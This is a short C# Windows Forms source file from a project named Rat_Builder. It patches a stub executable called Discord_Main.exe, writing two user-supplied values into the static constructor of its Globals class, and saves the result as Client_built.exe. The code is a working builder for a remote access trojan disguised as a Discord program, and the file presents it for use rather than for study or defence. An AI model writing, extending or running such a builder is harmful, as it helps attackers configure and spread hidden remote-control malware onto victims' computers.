using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;

namespace Rat_Builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string stub = Environment.CurrentDirectory + "\\Discord_Main.exe";
            string FullName = "Discord_Main.Globals";
            string outpath = Environment.CurrentDirectory + "\\Client_built.exe";
            var Assembly = AssemblyDef.Load(stub);
            var Module = Assembly.ManifestModule;
            if (Module != null)
            {
                var Settings = Module.GetTypes().Where(type => type.FullName == FullName).FirstOrDefault();
                if (Settings != null)
                {
                    var Constructor = Settings.FindMethod(".cctor");
                    if (Constructor != null)
                    {
                        Constructor.Body.Instructions[0].Operand = textBox1.Text;
                        Constructor.Body.Instructions[2].Operand = textBox2.Text;
                        try
                        {
                            Assembly.Write(outpath);
                            MessageBox.Show("built to: " + outpath);
                        }
                        catch (Exception b)
                        {
                            MessageBox.Show("ERROR: " + b);
                        }
                    }
                }
            }
        }
    }
}
